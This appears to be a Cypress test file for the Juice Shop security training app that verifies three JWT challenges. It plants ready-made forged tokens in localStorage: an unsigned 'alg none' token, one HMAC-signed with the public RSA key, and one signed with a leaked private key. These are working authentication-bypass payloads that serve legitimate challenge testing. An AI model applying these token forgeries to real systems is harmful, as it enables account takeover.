describe('/', () => {
  describe('challenge "jwtUnsigned"', () => {
    it('should accept an unsigned token with email jwtn3d@juice-sh.op in the payload ', () => {
      cy.window().then(() => {
        localStorage.setItem(
          'token',
          'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQGp1aWNlLXNoLm9wIn0sImlhdCI6MTUwODYzOTYxMiwiZXhwIjo5OTk5OTk5OTk5fQ.'
        )
      })
      cy.visit('/')
      cy.expectChallengeSolved({ challenge: 'Unsigned JWT' })
    })
  })

  describe('challenge "jwtForged"', () => {
    it('should accept a token HMAC-signed with public RSA key with email rsa_lord@juice-sh.op in the payload ', () => {
      cy.task('isWindows').then((isWindows) => {
        if (!isWindows) {
          cy.window().then(() => {
            localStorage.setItem(
              'token',
              'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImVtYWlsIjoicnNhX2xvcmRAanVpY2Utc2gub3AifSwiaWF0IjoxNTgzMDM3NzExfQ.gShXDT5TrE5736mpIbfVDEcQbLfteJaQUG7Z0PH8Xc8'
            )
          })
          cy.visit('/#/')

          cy.expectChallengeSolved({ challenge: 'Forged Signed JWT' })
        }
      })
    })
  })

  describe('challenge "iacLeakedKey"', () => {
    it('should accept an RS256-signed token with email cloud-admin@juice-sh.op using the leaked private key', () => {
      cy.window().then(() => {
        localStorage.setItem(
          'token',
          'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImVtYWlsIjoiY2xvdWQtYWRtaW5AanVpY2Utc2gub3AifSwiaWF0IjoxNzgzNTg3MDc1fQ.o1ghEUyLemmv982A2CW_w_RLh9FDYOx1GxU-_GeyEwfO8vBKIa-Ubh1bmdmP_WmySrekzy_0zfII-wjmj_e_6hKvZz0IDR_EyfDjCmYVzu8YdgQSNNZXu3_kLdXEKjJirXU5bPUdUIiR2GoMcOAXQouna3RAn4rkR90rDJeNblU'
        )
      })
      cy.visit('/#/')
      cy.expectChallengeSolved({ challenge: 'Login Cloud Admin' })
    })
  })
})
